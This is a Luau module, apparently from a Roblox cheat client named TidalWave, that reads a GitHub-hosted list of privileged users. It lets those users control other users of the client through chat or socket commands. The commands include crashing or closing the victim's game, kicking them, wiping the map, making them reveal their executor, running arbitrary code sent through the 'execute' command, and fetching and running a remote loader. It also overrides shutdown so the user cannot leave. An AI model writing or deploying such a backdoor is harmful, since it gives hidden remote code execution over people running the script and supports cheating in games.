const cloneref = cloneref or function(Obj) return Obj end

const function GetService(Service)
    return cloneref(game:GetService(Service))
end

const Players: Players = GetService('Players')
const HttpService: HttpService = GetService('HttpService')
const TextChatService: TextChatService = GetService('TextChatService')
const GuiService: GuiService = GetService('GuiService')
const CoreGui: CoreGui = GetService('CoreGui')
const Lighting: Lighting = GetService('Lighting')
const TweenService: TweenService = GetService('TweenService')
const UIS: UserInputService = GetService('UserInputService')
const VIM: VirtualInputManager = Instance.new('VirtualInputManager')

const Plr: Player = Players.LocalPlayer

const TidalWave = shared.TidalWave
const Libraries = TidalWave.Libraries
const EntityLib = Libraries.EntityLib
const Hash = Libraries.Hash
const ObjectFunctions = Libraries.ObjectFunctions
const Communication = Libraries.Communication

const function Notify(Properties)
    TidalWave:Notify(Properties)
end

const function SafeRef(Obj, Path)
    return ObjectFunctions:SafeRef(Obj, Path)
end

const function GetFullPlayerName(Player: Player): string
    return Player.DisplayName == Player.Name and Player.Name or `{Player.DisplayName} (@{Player.Name})`
end

local Whitelist = {
	CheckedPlayers = {},
	ReceivedUsers = {},
	Data = {
        WhitelistedUsers = {}
    },
	Hashes = setmetatable({}, {__index = function(self, i)
        self[i] = Hash.sha512(i)
        return self[i]
    end}),
    Hooked = false,
    Loaded = false,
	Level = 1,
    Socket = Communication:Connect('Whitelist')
}

type Tag = {
    Text: string, 
    Color: Color3
}

function Whitelist:Get(Player: Player): (number, boolean, Tag?)
    local PlayerHash = Whitelist.Hashes[Player.Name .. Player.UserId]
    for _, User in Whitelist.Data.WhitelistedUsers do
        for _, Hash in User.Hashes do
            if Hash == PlayerHash then
                return User.Level, User.Attackable or Whitelist.Level >= User.Level, User.Tag
            end
        end
    end

    return 1, true
end

function Whitelist:IsInGame(): boolean
    for _, Player in Players:GetPlayers() do
        if Whitelist:Get(Player) ~= 1 then
            return true
        end
    end

    return false
end

function Whitelist:Tag(Player: Player): string
    local Tag = select(3, Whitelist:Get(Player))
    
    return `<font color = '#{Tag.Color:ToHex()}'>[{Tag.Text}]</font> `
end

function Whitelist:GetPlayer(Arg: string, Player: Player): boolean
    Arg = Arg:lower()

    if Arg == 'default' and Whitelist.Level == 1 then
        return true
    end

    if Arg == 'private' and Whitelist.Level == 2 then
        return true
    end

    if (Arg == 'all' or Arg == 'others') and Player ~= Plr then
        return true
    end

    if Plr.Name:lower():sub(1, #Arg) == Arg then
        return true
    end

    return false
end

local OldShutdown

function Whitelist:PlayerAdded(Player: Player, Joined: boolean)
    if Whitelist:Get(Player) ~= 1 then
        if Whitelist.CheckedPlayers[Player.UserId] then return end
        Whitelist.CheckedPlayers[Player.UserId] = true
        Whitelist:Hook()

        if Whitelist.Level == 1 and not OldShutdown then
            OldShutdown = TidalWave.Shutdown

            const ShutdownHook = function()
                Notify({
                    Text = 'No escaping the private members :)',
                    Type = 'Error',
                    Duration = 10
                })
            end

            TidalWave.Shutdown = ShutdownHook
            TidalWave.Restart = ShutdownHook

			TidalWave:Clean(task.spawn(function()
				local TimePassed = 0
				repeat
					TimePassed += task.wait()
				until TimePassed >= 5 or EntityLib:FindEntity(Player)

				if not EntityLib.Alive then
					const TimeOut = os.clock() + 10
					repeat
						task.wait()
					until EntityLib.Alive or not shared.TidalWave or os.clock() >= TimeOut
					if not (EntityLib.Alive and shared.TidalWave) then return end
				end

				Whitelist.Socket:Send('IAmUsingTheTidalWaveClient')
			end))
        end
    end
end

function Whitelist:Process(Msg: string, Player: Player)
    if Msg:sub(1, 1) == ';' and Whitelist.Level < Whitelist:Get(Player) then
        local Args = Msg:split(' ')
        local Command = Args[1]:sub(2):lower()
        table.remove(Args, 1)

        if Args[1] and Whitelist:GetPlayer(Args[1], Player) then
            table.remove(Args, 1)
            for cmd, Function in Whitelist.Commands do
                if #Command <= #cmd and Command:sub(1, #cmd) == cmd then
                    Function(Args, Player)
                end
            end
        end
    end
end

local Messages = {}

function Whitelist:Chat(Obj: Frame, Player: Player, AlreadyAdded: boolean?)
    const TextMessage = Obj:WaitForChild('TextMessage', 0.1) :: Frame?
    const Body = TextMessage and TextMessage:WaitForChild('BodyText', 0.1) :: TextLabel?
    const Prefix = TextMessage and TextMessage:WaitForChild('PrefixText', 0.1) :: TextLabel?

	if not (TextMessage and Body and Prefix) then return end

    const OldBody = Body.Text
    const OldPrefix = Prefix.Text

    local Tag = Whitelist:Tag(Player)

    Prefix.Text = Tag .. OldPrefix
    Body.Text = Tag .. OldBody

    TidalWave:Clean(Prefix:GetPropertyChangedSignal('Text'):Connect(function()
        Prefix.Text = Tag .. OldPrefix
    end))

    TidalWave:Clean(Body:GetPropertyChangedSignal('Text'):Connect(function()
        Body.Text = Tag .. OldBody
    end))

    table.insert(Messages, {
        Reset = function()
            Prefix.Text = OldPrefix
            Body.Text = OldBody
        end,
        Update = function()
            Tag = Whitelist:Tag(Player)
            Prefix.Text = Tag .. OldPrefix
            Body.Text = Tag .. OldBody
        end
    })

    if not AlreadyAdded then
        Whitelist:Process(Body.ContentText:split(': ')[2], Player)
    end
end

const ScrollView_Path = {
    'contentFrame',
    'scrollingView',
    'bottomLockedScrollView',
    'scrollView'
}

local function ScrollView_ChildAdded(Obj: Frame, AlreadyAdded: boolean?)
    local UserID = Obj.Name:split('-')[1]
    UserID = UserID and UserID ~= '0' and tonumber(UserID) or nil
    local Player = UserID and Players:GetPlayerByUserId(UserID) or nil
    if Player and Whitelist:Get(Player) ~= 1 then
        Whitelist:Chat(Obj, Player, AlreadyAdded)
    end
end

local function ChatWindowAdded(Obj: Frame)
    if Obj.Name == 'chatWindow' then
        const TimeOut = os.clock() + 5
        local ScrollView = SafeRef(Obj, ScrollView_Path)

        if not ScrollView then
            repeat
                task.wait()
                ScrollView = SafeRef(Obj, ScrollView_Path)
            until ScrollView or os.clock() >= TimeOut

            if not ScrollView then return end
        end

        task.defer(function()
            TidalWave:Clean(ScrollView.ChildAdded:Connect(ScrollView_ChildAdded))

            for _, Obj in ScrollView:GetChildren() do
				task.spawn(ScrollView_ChildAdded, Obj, true)
            end
        end)
    end
end

function Whitelist:Hook()
    if Whitelist.Hooked then return end
    Whitelist.Hooked = true

    TidalWave:Clean(task.spawn(function()
        local AppLayout = SafeRef(CoreGui, {'ExperienceChat', 'appLayout'})

        if not AppLayout then
            repeat
                task.wait()
                AppLayout = SafeRef(CoreGui, {'ExperienceChat', 'appLayout'})
            until AppLayout
        end

        TidalWave:Clean(AppLayout.ChildAdded:Connect(ChatWindowAdded))
        TidalWave:Clean(AppLayout.ChildRemoved:Connect(function(Obj)
            if Obj.Name == 'chatWindow' then
                table.clear(Messages)
            end
        end))

        local ChatWindow = AppLayout:FindFirstChild('chatWindow')
        if ChatWindow then
            ChatWindowAdded(ChatWindow)
        end
    end))
end

function Whitelist:Update()
    local Success = pcall(function()
        local _, Subbed = pcall(function()
            return game:HttpGet('https://github.com/fluidnarrator30/Whitelists')
        end)

        local Commit = Subbed:find('currentOid')
        Commit = Commit and Subbed:sub(Commit + 13, Commit + 52) or nil
        Commit = Commit and #Commit == 40 and Commit or 'main'
        
        Whitelist.TextData = game:HttpGet(`https://raw.githubusercontent.com/fluidnarrator30/Whitelists/{Commit}/PlayerWhitelist.json`, true)
    end)

    if Success and Whitelist and (not Whitelist.Loaded or Whitelist.TextData ~= Whitelist.CurrentData) then
        if not Whitelist.Loaded then
            Whitelist.CurrentData = isfile and readfile and isfile('TidalWave/Profiles/Whitelist.json') and readfile('TidalWave/Profiles/Whitelist.json') or nil
        end

        local Result

        Success, Result = pcall(function()
            return HttpService:JSONDecode(Whitelist.TextData)
        end)

        Whitelist.Data = Success and typeof(Result) == 'table' and Result or Whitelist.Data
        Whitelist.Level = Whitelist:Get(Plr)

        for _, User in Whitelist.Data.WhitelistedUsers do
            if User.Tag then
                User.Tag.Color = Color3.fromRGB(table.unpack(User.Tag.Color))
            end
        end

        if not Whitelist.Connection then
            Whitelist.Connection = Players.PlayerAdded:Connect(function(Player)
                Whitelist:PlayerAdded(Player, true)
            end)

            TidalWave:Clean(Whitelist.Connection)
        end

        for _, Player in Players:GetPlayers() do
            Whitelist:PlayerAdded(Player)
        end

        for _, Message in Messages do
            Message:Update()
        end
        
        if Whitelist.TextData ~= Whitelist.CurrentData then
            Whitelist.CurrentData = Whitelist.TextData
            if writefile then
                writefile('TidalWave/Profiles/Whitelist.json', Whitelist.TextData)
            end
        end
    end

    Whitelist.Loaded = true

    return true
end

local FlashbangCooldown = false

Whitelist.Commands = {
    crash = function()
        task.spawn(function()
			while true do
				local Part = Instance.new('Part')
				Part.Size = vector.create(2048, 2048, 2048)
				Part.Parent = workspace
			end
        end)
    end,
    deletemap = function()
        local Terrain = workspace:FindFirstChildWhichIsA('Terrain')
        if Terrain then
            Terrain:Clear()
        end

        for _, Obj in workspace:GetChildren() do
            if EntityLib.Alive and Obj:IsDescendantOf(EntityLib.Character) then continue end

            if Obj ~= Terrain and not Obj:IsA('Camera') then
                Obj:Destroy()
                Obj:ClearAllChildren()
            end
        end
    end,
    fpscap = function(args)
        if #args < 1 or not setfpscap then return end
        setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
    end,
    gravity = function(args)
        workspace.Gravity = tonumber(args[1]) or workspace.Gravity
    end,
    jump = function()
        if EntityLib.Alive and EntityLib.Humanoid.FloorMaterial ~= Enum.Material.Air then
            EntityLib.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end,
    kick = function(args)
        task.spawn(function()
            Plr:Kick(table.concat(args, ' '))
        end)
    end,
    kill = function()
        if EntityLib.Alive then
            EntityLib.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
            EntityLib.Humanoid.Health = 0
        end
    end,
    reveal = function()
        task.delay(0.1, function()
            TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the TidalWave Client')
        end)
    end,
    revealdevice = function()
        task.delay(0.1, function()
            TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(`I am using a {UIS:GetPlatform().Name} device`)
        end)
    end,
    revealexecutor = function()
        task.delay(0.1, function()
            TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(`I am using the {({identifyexecutor()})[1]} Application`)
        end)
    end,
    altf4 = function()
        local Dialog = CoreGui:FindFirstChild('HeadsetDisconnectedDialog')
        if Dialog then
            Dialog.Enabled = true

            local Button = SafeRef(Dialog, {'Overlay', 'Alert', 'AlertContents', 'Footer', 'Buttons', '1'})
            if Button then
                GuiService.SelectedObject = Button
                task.wait()
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            end
        end
    end,
    closegame = function()
        game:Shutdown()
    end,
    toggle = function(Args)
        if #Args < 1 then return end
        if Args[1]:lower() == 'all' then
            for i, v in TidalWave.Modules do
                if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' then
                    v:Toggle(true)
                end
            end
        else
            for i, v in TidalWave.Modules do
                if i:lower() == Args[1]:lower() then
                    v:Toggle(true)
                    break
                end
            end
        end
    end,
    enable = function(Args)
        if #Args < 1 then return end
        if Args[1]:lower() == 'all' then
            for i, v in TidalWave.Modules do
                if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' and not v.Enabled then
                    v:Toggle(true)
                end
            end
        else
            for i, v in TidalWave.Modules do
                if i:lower() == Args[1]:lower() and not v.Enabled then
                    v:Toggle(true)
                    break
                end
            end
        end
    end,
    disable = function(Args)
        if #Args < 1 then return end
        if Args[1]:lower() == 'all' then
            for i, v in TidalWave.Modules do
                if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' and v.Enabled then
                    v:Toggle(true)
                end
            end
        else
            for i, v in TidalWave.Modules do
                if i:lower() == Args[1]:lower() and v.Enabled then
                    v:Toggle(true)
                    break
                end
            end
        end
    end,
    flashbang = function(Args)
		if FlashbangCooldown then return end
		FlashbangCooldown = true

        local Enabled = false
        if TidalWave.Modules.Fullbright and TidalWave.Modules.Fullbright.Enabled then
            Enabled = true
            TidalWave.Modules.Fullbright:Toggle(true)
        end

        local Sound = Instance.new('Sound')
        Sound.Volume = 0.5
        Sound.SoundId = 'rbxassetid://136315388392745'
        Sound.PlayOnRemove = true
        Sound.Parent = workspace
        Sound:Destroy()

        local Old = Lighting.ExposureCompensation
        Lighting.ExposureCompensation = 10
        task.wait(3)
        local Info = TweenInfo.new(5, Enum.EasingStyle.Exponential)
        local Tween = TweenService:Create(Lighting, Info, {ExposureCompensation = Old})
        Tween:Play()

        if Enabled then
            TidalWave.Modules.Fullbright:Toggle(true)
        end

		FlashbangCooldown = false
    end,
    trip = function(Args)
        if EntityLib.Alive then
            local Power = tonumber(Args[1]) or 15
            if vector.magnitude(EntityLib.Root.AssemblyLinearVelocity) < Power then
                EntityLib.Root.AssemblyLinearVelocity = EntityLib.Root.CFrame.LookVector * Power
            end

            EntityLib.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
        end
    end,
    shutdown = function()
        if OldShutdown then
            OldShutdown(TidalWave)
        else
            TidalWave:Shutdown()
        end
    end,
    void = function()
        if EntityLib.Alive then
            EntityLib.Root.CFrame += vector.create(0, -100, 0)
        end
    end,
    fling = function(Args)
        if EntityLib.Alive then
            local Power = tonumber(Args[1]) or 10000
            EntityLib.Root.AssemblyLinearVelocity = Random.new():NextUnitVector() * Power
            EntityLib.Root.AssemblyAngularVelocity = Random.new():NextUnitVector() * Power
        end
    end,
    execute = function(Args)
        loadstring(table.concat(Args, ' '))()
    end,
    freeze = function()
        if EntityLib.Alive then
            EntityLib.Root.Anchored = true
        end
    end,
    unfreeze = function()
        if EntityLib.Alive then
            EntityLib.Root.Anchored = false
        end
    end,
    disablecontrols = function()
        local PlayerModule = require(Plr.PlayerScripts.PlayerModule)
        local Controls = PlayerModule:GetControls()
        Controls:Disable()
    end,
    enablecontrols = function()
        local PlayerModule = require(Plr.PlayerScripts.PlayerModule)
        local Controls = PlayerModule:GetControls()
        Controls:Enable()
    end,
    droptools = function()
        if EntityLib.Alive then
            for _, Obj in Plr.Backpack:GetChildren() do
                if Obj:IsA('Tool') then
                    Obj.Parent = EntityLib.Character
                end
            end

            task.wait(0.2)

            for _, Obj in EntityLib.Character:GetChildren() do
                if Obj:IsA('Tool') then
                    Obj.Parent = workspace
                end
            end
        end
    end,
    tidalwave = function(Args)
        local TidalWave = loadstring(game:HttpGet('https://raw.githubusercontent.com/fluidnarrator30/Tidal-Wave/refs/heads/main/Loader.lua', true))
        for i = 1, tonumber(Args[1]) or 1 do
            task.spawn(TidalWave)
        end
    end
}

TidalWave:Clean(function()
    table.clear(Whitelist.Data.WhitelistedUsers)
    table.clear(Whitelist.Data)
    table.clear(Whitelist.Hashes)
    table.clear(Whitelist.CheckedPlayers)
    table.clear(Whitelist)

    Whitelist = nil
	VIM:Destroy()

    task.defer(function()
        for _, Message in Messages do
            Message:Reset()
        end
        table.clear(Messages)
		Messages = nil
    end)
end)

TidalWave:Clean(task.spawn(function()
    while Whitelist do
        Whitelist:Update()

        task.wait(10)
    end
end))

TidalWave:Clean(Whitelist.Socket.OnMessage:Connect(function(Player, Msg)
    if Whitelist.Level > 1 and Msg == 'IAmUsingTheTidalWaveClient' and not Whitelist.ReceivedUsers[Player.UserId] then
		Whitelist.ReceivedUsers[Player.UserId] = true
        Notify({
            Text = `{GetFullPlayerName(Player)} is using TidalWave.`,
            Duration = 30,
            Type = 'Warning'
        })
	else
		Whitelist:Process(Msg, Player)
    end
end))

return Whitelist